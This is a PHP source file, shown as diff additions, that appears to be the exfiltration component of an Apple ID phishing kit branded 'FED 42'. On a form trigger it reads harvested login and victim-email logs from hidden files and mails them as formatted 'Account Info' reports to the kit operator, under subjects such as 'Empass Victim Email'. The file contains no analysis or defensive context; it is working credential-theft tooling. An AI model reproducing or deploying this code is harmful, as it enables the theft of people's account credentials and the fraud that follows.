+$headers .= 'From: FED 42 <fed-42@server.tech>' . "\r\n";
+$to = $Your_Email;
+if (isset($_POST['sendlogg'])) {
+$subj = "Empass Apple ID";
+$list = file_get_contents("assets/logs/.login.txt");
+$data = "
+    
+     <html>
+		    <body>
+		       <div style='background-color:transparent;'>
+      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #63717f;' class='block-grid '>
+        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#63717f;'>
+          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->
+
+              <!--[if (mso)|(IE)]><td align='center' width='480' style='background-color:#47A7E0; width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
+            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
+              <div style='background-color: #47A7E0; width: 100% !important;'>
+              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->
+
+                  
+                    <div class=''>
+  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
+  <div style='color:#FFFFFF;line-height:150%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'>  
+    <div style='font-size:12px;line-height:18px;color:#FFFFFF;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 14px;line-height: 21px'>[+] SC FED-42 [+]</p></div> 
+  </div>
+  <!--[if mso]></td></tr></table><![endif]-->
+</div>
+                  
+              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
+              </div>
+            </div>
+          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
+        </div>
+      </div>
+    </div>    <div style='background-color:transparent;'>
+      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
+        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
+          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->
+
+              <!--[if (mso)|(IE)]><td align='center' width='480' style=' width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
+            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
+              <div style='background-color: transparent; width: 100% !important;'>
+              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->
+
+                  
+                    <div class=''>
+  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
+  <div style='color:#555555;line-height:200%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;'>  
+    <div style='font-size:12px;line-height:24px;color:#555555;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 12px;line-height: 24px'><p style='margin: 0;font-size: 12px;line-height: 24px'>++==================== [ Account Info ] ==================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>".$list."</p>
+</div> 
+  </div>
+  <!--[if mso]></td></tr></table><![endif]-->
+</div>
+                  
+              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
+              </div>
+            </div>
+          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
+        </div>
+      </div>
+    </div>    <div style='background-color:transparent;'>
+      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
+        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
+          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->
+
+              <!--[if (mso)|(IE)]><td align='center' width='480' style='background-color:#47A7E0; width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
+            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
+              <div style='background-color: #47A7E0; width: 100% !important;'>
+              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->
+
+                  
+                    <div class=''>
+  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
+  <div style='color:#FFFFFF;line-height:150%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'>  
+    <div style='font-size:12px;line-height:18px;color:#FFFFFF;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 14px;line-height: 21px'>[+] GOOD WORDS COOL MORE THAN COLD WATER [+]</p></div>  
+  </div>
+  <!--[if mso]></td></tr></table><![endif]-->
+</div>
+                  
+              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
+              </div>
+            </div>
+          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
+        </div>
+      </div>
+    </div>
+		    </body>
+	    </html>
+
+    
+    ";
+mail($to, $subj, $data, $headers);
+}
+if(isset($_POST['sendloge'])) {
+$subj = "Empass Victim Email";
+$list = file_get_contents("assets/logs/.logine.txt");
+$data = "
+    
+     <html>
+		    <body>
+		       <div style='background-color:transparent;'>
+      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
+        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
+          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->
+
+              <!--[if (mso)|(IE)]><td align='center' width='480' style='background-color:#47A7E0; width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
+            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
+              <div style='background-color: #47A7E0; width: 100% !important;'>
+              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->
+
+                  
+                    <div class=''>
+  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
+  <div style='color:#FFFFFF;line-height:150%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'>  
+    <div style='font-size:12px;line-height:18px;color:#FFFFFF;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 14px;line-height: 21px'>[+] SC FED-42 [+]</p></div> 
+  </div>
+  <!--[if mso]></td></tr></table><![endif]-->
+</div>
+                  
+              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
+              </div>
+            </div>
+          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
+        </div>
+      </div>
+    </div>    <div style='background-color:transparent;'>
+      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
+        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
+          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->
+
+              <!--[if (mso)|(IE)]><td align='center' width='480' style=' width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
+            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
+              <div style='background-color: transparent; width: 100% !important;'>
+              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->
+
+                  
+                    <div class=''>
+  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
+  <div style='color:#555555;line-height:200%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;'>  
+    <div style='font-size:12px;line-height:24px;color:#555555;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 12px;line-height: 24px'><p style='margin: 0;font-size: 12px;line-height: 24px'>++==================== [ Account Info ] ==================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>".$list."</p>
+</div> 
+  </div>
+  <!--[if mso]></td></tr></table><![endif]-->
+</div>
+                  
+              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
+              </div>
+            </div>
+          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
+        </div>
+      </div>
+    </div>    <div style='background-color:transparent;'>
+      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
+        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
+          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->
+
+              <!--[if (mso)|(IE)]><td align='center' width='480' style='background-color:#47A7E0; width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
+            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
+              <div style='background-color: #47A7E0; width: 100% !important;'>
+              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->
+
+                  
+                    <div class=''>
+  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
+  <div style='color:#FFFFFF;line-height:150%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'>  
+    <div style='font-size:12px;line-height:18px;color:#FFFFFF;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 14px;line-height: 21px'>[+] GOOD WORDS COOL MORE THAN COLD WATER [+]</p></div>  
+  </div>
+  <!--[if mso]></td></tr></table><![endif]-->
+</div>
+                  
+              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
+              </div>
+            </div>
+          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
+        </div>
+      </div>
+    </div>
+		    </body>
+	    </html>
+
+    
+    ";
+mail($to, $subj, $data, $headers);
+}
+isset($_POST) == array ();
+?>
